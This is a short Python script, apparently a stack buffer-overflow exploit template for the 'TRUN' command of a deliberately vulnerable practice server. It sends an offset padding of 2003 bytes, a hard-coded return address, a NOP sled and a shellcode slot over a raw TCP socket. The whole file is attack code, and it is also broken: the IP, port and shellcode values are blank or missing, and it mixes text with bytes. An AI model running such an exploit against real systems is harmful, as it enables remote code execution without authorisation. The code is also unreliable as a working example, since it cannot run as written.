#!/usr/bin/python3
import sys, socket

ip = ''
port=
command = "TRUN /.:/"
# Byte Encode by adding b in front of every single line
overflow =      

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        
        payload = command + shellcode

        s.send((payload))
        s.close()

except:
        print ("Error Connecting to Server")
        sys.exit()